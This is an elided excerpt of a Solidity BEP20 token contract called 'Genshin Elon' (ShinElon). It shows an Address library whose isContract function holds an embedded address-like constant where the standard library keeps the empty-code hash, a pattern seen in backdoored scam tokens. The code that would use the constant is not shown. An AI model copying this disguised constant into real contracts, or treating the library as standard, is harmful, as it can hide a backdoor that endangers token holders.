...
library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 accountHash =
            0x00000000000000000000000034145cd6e23a02BfbC30AF1AA4A566261a48Ac85;
        bytes32 codehash;
        assembly {
...
contract ShinElon is Context, IBEP20, Ownable {
    ...
    string private _name = "Genshin Elon";
    string private _symbol = "ShinElon";
